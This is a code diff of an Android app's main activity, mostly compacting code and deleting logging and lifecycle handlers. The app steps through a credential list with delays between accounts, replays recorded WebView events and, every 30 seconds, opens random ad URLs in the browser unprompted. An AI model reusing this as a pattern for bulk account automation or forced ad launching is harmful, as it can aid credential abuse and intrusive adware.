-    private void shareResults(String results) {
-        if (results == null || results.isEmpty()) {
-            Toast.makeText(this, "Nothing to share", Toast.LENGTH_SHORT).show();
-            return;
-        }
-        // Results are already formatted line-by-line in logResult
-        android.content.Intent sendIntent = new android.content.Intent();
-        sendIntent.setAction(android.content.Intent.ACTION_SEND);
-        sendIntent.putExtra(android.content.Intent.EXTRA_TEXT, results);
-        sendIntent.setType("text/plain");
-
-        startActivity(android.content.Intent.createChooser(sendIntent, "Share Results"));
+    private void shareResults(String res) {
+        android.content.Intent i = new android.content.Intent(android.content.Intent.ACTION_SEND);
+        i.putExtra(android.content.Intent.EXTRA_TEXT, res);
+        i.setType("text/plain");
+        startActivity(android.content.Intent.createChooser(i, "Share"));
     }
 
     private void startAdChecker() {
         adCheckRunnable = new Runnable() {
-            @Override
             public void run() {
-                long nextAdTime = AdManager.getNextAdTime(MainActivity.this);
-                if (System.currentTimeMillis() >= nextAdTime) {
-                    triggerAutoAd();
-                }
-                adCheckHandler.postDelayed(this, 30000); // Check every 30 seconds
+                if (System.currentTimeMillis() >= AdManager.getNextAdTime(MainActivity.this)) triggerAutoAd();
+                adCheckHandler.postDelayed(this, 30000);
             }
         };
         adCheckHandler.postDelayed(adCheckRunnable, 5000);
     }
 
     private void triggerAutoAd() {
-        Log.i(TAG, "Triggering Auto Ad Externally");
         AdManager.resetAutoAdTimer(this);
         String url = AdManager.getRandomAdUrl();
         try {
-            android.content.Intent intent = new android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(url));
-            startActivity(intent);
+            startActivity(new android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(url)));
         } catch (Exception e) {
-            Log.e(TAG, "Could not open external browser", e);
-            // Fallback to internal if external fails (unlikely)
-            android.content.Intent intent = new android.content.Intent(this, AdActivity.class);
-            intent.putExtra("url", url);
-            startActivity(intent);
+            android.content.Intent i = new android.content.Intent(this, AdActivity.class);
+            i.putExtra("url", url);
+            startActivity(i);
         }
     }
 
-    @Override
-    protected void onDestroy() {
-        super.onDestroy();
-        adCheckHandler.removeCallbacks(adCheckRunnable);
-    }
-
-    private void moveToNext(int completedIndex) {
-        if (completedIndex != currentCredentialIndex) return;
-
+    private void moveToNext(int idx) {
+        if (idx != currentCredentialIndex) return;
         currentCredentialIndex++;
         nextCredentialRunnable = this::processNextCredential;
-        // Keep the 10 second delay before the next account starts, as requested
         batchHandler.postDelayed(nextCredentialRunnable, 10000);
-    }
-
-    private void saveSessionToPrefs() {
-        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
-        SharedPreferences.Editor editor = prefs.edit();
-        JSONArray jsonArray = new JSONArray(currentSessionEvents);
-        editor.putString(KEY_EVENTS, jsonArray.toString());
-        editor.apply();
-    }
-
-    private void loadSavedEvents() {
-        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
-        String jsonString = prefs.getString(KEY_EVENTS, "[]");
-        try {
-            JSONArray jsonArray = new JSONArray(jsonString);
-            currentSessionEvents.clear();
-            for (int i = 0; i < jsonArray.length(); i++) {
-                currentSessionEvents.add(jsonArray.getJSONObject(i));
-            }
-        } catch (JSONException e) {
-            Log.e(TAG, "Error loading events", e);
-        }
     }
 
     private String readAssetFile(String fileName) {
@@ -774,74 +664,39 @@ public class MainActivity extends Activity {
             BufferedReader reader = new BufferedReader(new InputStreamReader(is));
             StringBuilder sb = new StringBuilder();
             String line;
-            while ((line = reader.readLine()) != null) {
-                sb.append(line).append("\n");
-            }
+            while ((line = reader.readLine()) != null) sb.append(line).append("\n");
             return sb.toString();
-        } catch (IOException e) {
-            Log.e(TAG, "Error reading asset: " + fileName, e);
-            return "";
-        }
-    }
-
-    @Override
-    public void onBackPressed() {
-        if (mWebView.canGoBack()) {
-            mWebView.goBack();
-        } else {
-            super.onBackPressed();
-        }
+        } catch (IOException e) { return ""; }
     }
 
     private void showOfflineDialog() {
         new AlertDialog.Builder(this)
-            .setTitle("No Internet Connection")
-            .setMessage("Please check your internet connection and restart the app.")
+            .setTitle("No Internet")
+            .setMessage("Check internet connection.")
             .setCancelable(false)
-            .setPositiveButton("Exit", (dialog, which) -> finish())
+            .setPositiveButton("Exit", (d, w) -> finish())
             .show();
     }
 
     private boolean isConnected() {
-        ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
-        NetworkInfo netInfo = cm.getActiveNetworkInfo();
-        return netInfo != null && netInfo.isConnected();
+        NetworkInfo ni = ((ConnectivityManager)getSystemService(CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
+        return ni != null && ni.isConnected();
     }
 
     public class WebAppInterface {
         Context mContext;
-
-        WebAppInterface(Context c) {
-            mContext = c;
-        }
-
-        @JavascriptInterface
-        public void showAd(String url) {
-           // Kept for backward compatibility
-        }
-
-        @JavascriptInterface
-        public void saveSession(String jsonString) {
-           // Deprecated: We now stream events. Keeping empty stub just in case of old cache.
-        }
-
-        @JavascriptInterface
-        public void recordEvent(String eventJson) {
+        WebAppInterface(Context c) { mContext = c; }
+        @JavascriptInterface public void showAd(String url) {}
+        @JavascriptInterface public void saveSession(String jsonString) {}
+        @JavascriptInterface public void recordEvent(String eventJson) {
             try {
-                JSONObject event = new JSONObject(eventJson);
-                currentSessionEvents.add(event);
-                Log.d(TAG, "Recorded event: " + event.getString("type"));
-            } catch (JSONException e) {
-                Log.e(TAG, "Failed to parse event", e);
-            }
+                if (recordingMode == RECORD_MODE_SUCCESS) {
+                    currentSessionEvents.add(new JSONObject(eventJson));
+                }
+            } catch (JSONException e) {}
         }
-
-        @JavascriptInterface
-        public void eventExecuted(int index) {
-            if (index > lastExecutedIndex) {
-                lastExecutedIndex = index;
-                Log.d(TAG, "Executed event index: " + index);
-            }
+        @JavascriptInterface public void eventExecuted(int index) {
+            if (index > lastExecutedIndex) lastExecutedIndex = index;
         }
     }
 }
